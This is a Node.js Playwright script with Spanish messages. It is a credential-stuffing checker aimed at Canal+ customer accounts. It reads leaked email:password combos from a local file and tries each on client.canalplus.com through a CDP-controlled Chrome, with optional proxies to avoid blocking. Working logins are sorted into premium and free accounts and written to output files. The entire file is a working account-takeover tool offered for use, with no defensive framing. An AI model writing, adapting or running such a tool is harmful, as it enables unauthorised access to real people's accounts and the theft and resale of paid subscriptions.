const fs = require('fs');
const readline = require('readline');
const { chromium } = require('playwright');
const chalk = require('chalk');
const cliProgress = require('cli-progress');
const ora = require('ora').default;

// Archivos
const comboPath = 'C:\\Users\\opc\\Documents\\cplus\\combo.txt';
const validPath = 'C:\\Users\\opc\\Documents\\cplus\\validacceso.txt';
const freePath = 'C:\\Users\\opc\\Documents\\cplus\\free.txt';

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const ask = (question) => new Promise(resolve => rl.question(question, resolve));

(async () => {
  console.log(chalk.cyan('?? Asegúrate de que ya abriste Chrome con el puerto CDP habilitado (9222).'));

  // Preguntar si desea usar proxy
  const usarProxies = (await ask('¿Deseas usar proxy? (s/n): ')).toLowerCase();

  let proxyToShow = null;
  if (usarProxies === 's') {
    const proxyFilePath = await ask('Ingresa la ruta del archivo de proxies (ip:puerto): ');
    if (!fs.existsSync(proxyFilePath)) {
      console.log(chalk.red('? Archivo de proxies no encontrado.'));
      process.exit();
    }

    const proxies = fs.readFileSync(proxyFilePath, 'utf8').split('\n').map(p => p.trim()).filter(Boolean);

    if (proxies.length === 0) {
      console.log(chalk.red('? El archivo de proxies está vacío.'));
      process.exit();
    }

    proxyToShow = proxies[0];
    console.log(chalk.magenta(`?? Recuerda configurar este proxy manualmente en Chrome: ${proxyToShow}`));
  } else {
    console.log(chalk.yellow('?? Se ejecutará sin proxy.'));
  }

  const combos = fs.readFileSync(comboPath, 'utf8').split('\n').map(l => l.trim()).filter(Boolean);

  // Barra de progreso
  const bar = new cliProgress.SingleBar({
    format: '{bar} | {percentage}% | {value}/{total} combos | Válidos: {valid} | Inválidos: {invalid}',
    barCompleteChar: '\u2588',
    barIncompleteChar: '\u2591',
    hideCursor: true
  }, cliProgress.Presets.shades_classic);

  bar.start(combos.length, 0, { valid: 0, invalid: 0 });

  let validCount = 0;
  let invalidCount = 0;

  for (const combo of combos) {
    const [email, password] = combo.split(':');

    const spinner = ora(`Comprobando ${email}:${password}`).start();

    try {
      const browser = await chromium.connectOverCDP('http://localhost:9222');
      const context = await browser.newContext();
      const page = await context.newPage();

      await page.goto('https://client.canalplus.com/?sc_intcmp=MYCWEB:USERMENU:EC');
      await page.waitForLoadState('load');

      await page.click('xpath=//*[@id="didomi-notice-agree-button"]/span').catch(() => {});
      await page.waitForTimeout(1000);

      await page.click('xpath=//*[@id="app"]/div/div/main/div/div[2]/div[1]/div[1]/button');
      await page.waitForTimeout(1000);

      await page.fill('xpath=//*[@id="input28"]', email);
      await page.fill('xpath=//*[@id="input36"]', password);
      await page.click('xpath=//*[@id="form20"]/div[2]/input');

      await page.waitForTimeout(8000);

      const error = await page.$('xpath=//*[@id="error-message"]');
      const success = await page.$('xpath=//*[@id="app"]/div/div/main/div/div[2]/nav/ul/li[2]/a/div[1]/div');

      if (error) {
        spinner.fail(chalk.red(`${combo} ? INVÁLIDO`));
        invalidCount++;
      } else if (success) {
        // Click para abrir la sección de cuenta
        await success.click();
        await page.waitForTimeout(7000);

        const freeIndicator = await page.$('xpath=//*[@id="app"]/div/div/main/div/div/div/div[3]/h2');

        if (!freeIndicator) {
          spinner.warn(chalk.hex('#FFA500')(`${combo} ?? VÁLIDO pero cuenta FREE`));
          fs.appendFileSync(freePath, combo + '\n', 'utf8');
        } else {
          spinner.succeed(chalk.green(`${combo} ? PREMIUM`));
          fs.appendFileSync(validPath, combo + '\n', 'utf8');
          validCount++;
        }
      } else {
        spinner.warn(chalk.yellow(`${combo} ?? Resultado incierto`));
      }

      await browser.close();

    } catch (err) {
      spinner.fail(chalk.red(`?? Error en ${combo}: ${err.message}`));
    }

    bar.update(bar.value + 1, { valid: validCount, invalid: invalidCount });
    await new Promise(resolve => setTimeout(resolve, 3000));
  }

  bar.stop();
  rl.close();
  console.log(chalk.cyan('\n? Proceso terminado.'));
})();
